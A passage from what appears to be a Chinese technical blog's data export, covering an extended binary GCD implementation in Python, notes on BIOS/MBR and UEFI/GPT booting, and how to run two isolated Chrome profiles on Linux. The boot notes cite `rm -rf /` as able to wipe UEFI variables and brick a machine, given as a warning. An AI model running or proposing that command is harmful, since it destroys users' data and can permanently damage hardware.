class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">extendBinaryGCD</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Extended binary GCD.</span></span><br><span class=\"line\"><span class=\"string\">    Given input a, b the function returns s, t, d</span></span><br><span class=\"line\"><span class=\"string\">    such that gcd(a,b) = d = as + bt.\"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>, <span class=\"number\">1</span>, b</span><br><span class=\"line\">    <span class=\"keyword\">if</span> b == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">0</span>, a</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == b:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">0</span>, a</span><br><span class=\"line\">    u, v, s, t, r = <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (a % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (b % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">        a, b, r = a // <span class=\"number\">2</span>, b // <span class=\"number\">2</span>, r + <span class=\"number\">1</span></span><br><span class=\"line\">    alpha, beta = a, b</span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># from here on we maintain a = u * alpha + v * beta</span></span><br><span class=\"line\">    <span class=\"comment\"># and b = s * alpha + t * beta</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> a % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"comment\"># v is always even</span></span><br><span class=\"line\">        a = a // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (u % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (v % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">            u, v = u // <span class=\"number\">2</span>, v // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            u, v = (u + beta) // <span class=\"number\">2</span>, (v - alpha) // <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> a != b:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> b % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            b = b // <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"comment\">#</span></span><br><span class=\"line\">            <span class=\"comment\"># Commentary: note that here, since b is even,</span></span><br><span class=\"line\">            <span class=\"comment\"># (i) if s, t are both odd then so are alpha, beta</span></span><br><span class=\"line\">            <span class=\"comment\"># (ii) if s is odd and t even then alpha must be even, so beta is odd</span></span><br><span class=\"line\">            <span class=\"comment\"># (iii) if t is odd and s even then beta must be even, so alpha is odd</span></span><br><span class=\"line\">            <span class=\"comment\"># so for each of (i), (ii) and (iii) s + beta and t - alpha are even</span></span><br><span class=\"line\">            <span class=\"comment\">#</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (s % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (t % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">                s, t = s // <span class=\"number\">2</span>, t // <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                s, t = (s + beta) // <span class=\"number\">2</span>, (t - alpha) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> b &lt; a:</span><br><span class=\"line\">            a, b, u, v, s, t = b, a, s, t, u, v</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            b, s, t = b - a, s - u, t - v</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s, t, (<span class=\"number\">2</span> ** r) * a</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立</p>\n</li>\n</ul>\n","slug":"Binary-GCD-And-Extend-Binary-GCD","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"欧几里得算法","slug":"欧几里得算法","permalink":"https://h-zex.github.io/tags/欧几里得算法/"},{"name":"扩展欧几里得","slug":"扩展欧几里得","permalink":"https://h-zex.github.io/tags/扩展欧几里得/"},{"name":"二进制欧几里得算法","slug":"二进制欧几里得算法","permalink":"https://h-zex.github.io/tags/二进制欧几里得算法/"}]},{"title":"Booting a System","date":"2018-09-17T01:22:08.000Z","path":"2018/09/17/Booting-a-System/","text":"Legacy BIOS 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record” 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用 MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的 MBR MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks. EFI Intel’s extensible firmware interface (EFI) EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用 GPT The EFI partitioning scheme, known as a “GUID partition table” or GPT A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started. 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT. The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy. Windows and GPT FAQ Can a disk be both GPT and MBR?No. However, all GPT disks contain a Protective MBR. What is a Protective MBR?The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk. Why does the GPT have a Protective MBR?The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned. Why would a GPT-partitioned disk appear to have an MBR on it?This occurrs when you use an MBR-only-aware disk tool to access the GPT disk. 如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘 不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。 ESP The EFI system partition (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot. The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see UEFI specification version 2.7, section 13.3.1.1), but any conformant vendor can optionally add support for additional filesystems; for example, Apple Macs support (and by default use) their own HFS+ filesystem drivers. 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。 At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it. BOOT 没有boot block（除了Protective MBR） 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader 在modern intel system，UEFI默认从/efi/boot/boot64.efi加载。这个路径可以作为一个参数配置 UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量 firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写） 在那些默认允许写的系统(typically, those with systemd)，rm -rf / 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through /sys ​","raw":"---\ntitle: Booting a System\ntags:\n- boot\n- unix/linux\ncategories:\n- 运维\ndate: 2018-09-17 09:22:08\n---\n\n## Legacy BIOS \n\n- 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表\n- 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as \"active\"的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做\"volume boot record\"\n- 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的\"dead zone\"。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用\n- MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的\n\n### MBR\n\n- > MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.\n\n## EFI\n\n- Intel’s extensible firmware interface (EFI) \n- EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用\n\n### GPT\n\n- The EFI partitioning scheme, known as a “GUID partition table” or GPT\n\n  > A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.\n\n- 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID\n\n  > The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.\n  >\n  > The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.\n\n-  > [Windows and GPT FAQ](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq)\n   >\n   > ##### Can a disk be both GPT and MBR?\n   >\n   > No. However, all GPT disks contain a Protective MBR.\n   >\n   > ##### What is a Protective MBR?\n   >\n   > The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.\n   >\n   > ##### Why does the GPT have a Protective MBR?\n   >\n   > The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don't know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.\n   >\n   > ##### Why would a GPT-partitioned disk appear to have an MBR on it?\n   >\n   > This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.\n   >\n\n-  如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘\n\n-  不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。\n\n### ESP \n\n- > The [EFI system partition](https://en.wikipedia.org/wiki/EFI_system_partition) (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.\n  >\n  > The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see [UEFI specification version 2.7, section 13.3.1.1](http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485)), but any conformant vendor can optionally add support for additional filesystems; for example, Apple [Macs](https://wiki.archlinux.org/index.php/Mac) support (and by default use) their own HFS+ filesystem drivers.\n\n- 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。\n\n- > At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.\n\n### BOOT\n\n- 没有boot block（除了Protective MBR）\n\n- 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader\n\n- 在modern intel system，UEFI默认从`/efi/boot/boot64.efi`加载。这个路径可以作为一个参数配置\n\n- UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。\n\n- 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量\n\n- firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）\n\n- 在那些默认允许写的系统(typically, those with systemd)，`rm -rf /` 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through `/sys`\n\n  ​","content":"<h2 id=\"Legacy-BIOS\"><a href=\"#Legacy-BIOS\" class=\"headerlink\" title=\"Legacy BIOS\"></a>Legacy BIOS</h2><ul>\n<li>传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表</li>\n<li>无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record”</li>\n<li>第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用</li>\n<li>MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的</li>\n</ul>\n<h3 id=\"MBR\"><a href=\"#MBR\" class=\"headerlink\" title=\"MBR\"></a>MBR</h3><ul>\n<li><blockquote>\n<p>MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"EFI\"><a href=\"#EFI\" class=\"headerlink\" title=\"EFI\"></a>EFI</h2><ul>\n<li>Intel’s extensible firmware interface (EFI) </li>\n<li>EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用</li>\n</ul>\n<h3 id=\"GPT\"><a href=\"#GPT\" class=\"headerlink\" title=\"GPT\"></a>GPT</h3><ul>\n<li><p>The EFI partitioning scheme, known as a “GUID partition table” or GPT</p>\n<blockquote>\n<p>A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.</p>\n</blockquote>\n</li>\n<li><p>只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID</p>\n<blockquote>\n<p>The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.</p>\n<p>The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p><a href=\"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq\" target=\"_blank\" rel=\"noopener\">Windows and GPT FAQ</a></p>\n<h5 id=\"Can-a-disk-be-both-GPT-and-MBR\"><a href=\"#Can-a-disk-be-both-GPT-and-MBR\" class=\"headerlink\" title=\"Can a disk be both GPT and MBR?\"></a>Can a disk be both GPT and MBR?</h5><p>No. However, all GPT disks contain a Protective MBR.</p>\n<h5 id=\"What-is-a-Protective-MBR\"><a href=\"#What-is-a-Protective-MBR\" class=\"headerlink\" title=\"What is a Protective MBR?\"></a>What is a Protective MBR?</h5><p>The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.</p>\n<h5 id=\"Why-does-the-GPT-have-a-Protective-MBR\"><a href=\"#Why-does-the-GPT-have-a-Protective-MBR\" class=\"headerlink\" title=\"Why does the GPT have a Protective MBR?\"></a>Why does the GPT have a Protective MBR?</h5><p>The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.</p>\n<h5 id=\"Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\"><a href=\"#Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\" class=\"headerlink\" title=\"Why would a GPT-partitioned disk appear to have an MBR on it?\"></a>Why would a GPT-partitioned disk appear to have an MBR on it?</h5><p>This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.</p>\n</blockquote>\n</li>\n<li><p>如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘</p>\n</li>\n<li><p>不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。</p>\n</li>\n</ul>\n<h3 id=\"ESP\"><a href=\"#ESP\" class=\"headerlink\" title=\"ESP\"></a>ESP</h3><ul>\n<li><blockquote>\n<p>The <a href=\"https://en.wikipedia.org/wiki/EFI_system_partition\" target=\"_blank\" rel=\"noopener\">EFI system partition</a> (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.</p>\n<p>The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see <a href=\"http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485\" target=\"_blank\" rel=\"noopener\">UEFI specification version 2.7, section 13.3.1.1</a>), but any conformant vendor can optionally add support for additional filesystems; for example, Apple <a href=\"https://wiki.archlinux.org/index.php/Mac\" target=\"_blank\" rel=\"noopener\">Macs</a> support (and by default use) their own HFS+ filesystem drivers.</p>\n</blockquote>\n</li>\n<li><p>因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。</p>\n</li>\n<li><blockquote>\n<p>At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"BOOT\"><a href=\"#BOOT\" class=\"headerlink\" title=\"BOOT\"></a>BOOT</h3><ul>\n<li><p>没有boot block（除了Protective MBR）</p>\n</li>\n<li><p>在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader</p>\n</li>\n<li><p>在modern intel system，UEFI默认从<code>/efi/boot/boot64.efi</code>加载。这个路径可以作为一个参数配置</p>\n</li>\n<li><p>UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。</p>\n</li>\n<li><p>因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量</p>\n</li>\n<li><p>firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）</p>\n</li>\n<li><p>在那些默认允许写的系统(typically, those with systemd)，<code>rm -rf /</code> 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through <code>/sys</code></p>\n<p>​</p>\n</li>\n</ul>\n","slug":"Booting-a-System","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"boot","slug":"boot","permalink":"https://h-zex.github.io/tags/boot/"},{"name":"unix/linux","slug":"unix-linux","permalink":"https://h-zex.github.io/tags/unix-linux/"}]},{"title":"How to Have Two Chromes at Linux","date":"2018-09-10T13:26:34.000Z","path":"2018/09/10/How-to-Have-Two-Chromes-at-Linux/","text":"需求 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。 那么，就需要两个chrome的环境 chrome的用户数据 linux下chrome的默认用户数据存储在/home/&lt;user-name&gt;/.config/google-chrome，可以使用--user-data-dir=DIR参数启动chrome来使得chrome使用另一个目录作为用户data目录 –user-data-dir=DIRSpecifies the directory that user data (your “profile”) is kept in. Defaults to $HOME/.config/google-chrome . Separate instances of GoogleChrome must use separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user datadirectory. 接下来 1234cd /home/&lt;user-name&gt;/.config/mv google-chrome xxx # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息# 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。） 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上--user-data-dir=DIR参数打开chrome即可 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题） 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome dpkg -x xxx.deb folder即可把deb包解压到folder文件夹中 然后使用使用chown命令修改folder/opt/google/chrome/chrome-sandbox的拥有者为root，然后使用chmod 4755修改该文件的权限，才可以使用这个chrome 使用方法，直接在folder/opt/google/chrome/目录下运行./chrome即可","raw":"---\ntitle: How to Have Two Chromes at Linux\ndate: 2018-09-10 21:26:34\ntags:\n- 运维\n- 小技巧\n- chrome\n- linux\ncategories:\n- 运维\n---\n\n### 需求\n\n- 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。\n- 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。\n- 那么，就需要两个chrome的环境\n\n### chrome的用户数据\n\n- linux下chrome的默认用户数据存储在`/home/<user-name>/.config/google-chrome`，可以使用`--user-data-dir=DIR`参数启动chrome来使得chrome使用另一个目录作为用户data目录\n   > --user-data-dir=DIR\n   > Specifies the directory that user data (your \"profile\") is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google\n   > Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data\n   > directory.\n- 接下来\n   ```shell\n   cd /home/<user-name>/.config/\n   mv google-chrome xxx \n   # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息\n   # 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息\n   ```\n   接下来，打开chrome（不加--user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）\n- 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上`--user-data-dir=DIR`参数打开chrome即可\n- 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）\n\n\n### 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\n\n- `dpkg -x xxx.deb folder`即可把deb包解压到folder文件夹中\n- 然后使用使用`chown`命令修改`folder/opt/google/chrome/chrome-sandbox`的拥有者为root，然后使用`chmod 4755`修改该文件的权限，才可以使用这个chrome\n- 使用方法，直接在`folder/opt/google/chrome/`目录下运行`./chrome`即可\n","content":"<h3 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h3><ul>\n<li>由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。</li>\n<li>而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。</li>\n<li>那么，就需要两个chrome的环境</li>\n</ul>\n<h3 id=\"chrome的用户数据\"><a href=\"#chrome的用户数据\" class=\"headerlink\" title=\"chrome的用户数据\"></a>chrome的用户数据</h3><ul>\n<li>linux下chrome的默认用户数据存储在<code>/home/&lt;user-name&gt;/.config/google-chrome</code>，可以使用<code>--user-data-dir=DIR</code>参数启动chrome来使得chrome使用另一个目录作为用户data目录<blockquote>\n<p>–user-data-dir=DIR<br>Specifies the directory that user data (your “profile”) is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google<br>Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data<br>directory.</p>\n</blockquote>\n</li>\n<li><p>接下来</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /home/&lt;user-name&gt;/.config/</span><br><span class=\"line\">mv google-chrome xxx </span><br><span class=\"line\"><span class=\"meta\">#</span> 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息</span><br><span class=\"line\"><span class=\"meta\">#</span> 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息</span><br></pre></td></tr></table></figure>\n<p> 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）</p>\n</li>\n<li>把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上<code>--user-data-dir=DIR</code>参数打开chrome即可</li>\n<li>由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）</li>\n</ul>\n<h3 id=\"从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\"><a href=\"#从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\" class=\"headerlink\" title=\"从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\"></a>从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome</h3><ul>\n<li><code>dpkg -x xxx.deb folder</code>即可把deb包解压到folder文件夹中</li>\n<li>然后使用使用<code>chown</code>命令修改<code>folder/opt/google/chrome/chrome-sandbox</code>的拥有者为root，然后使用<code>chmod 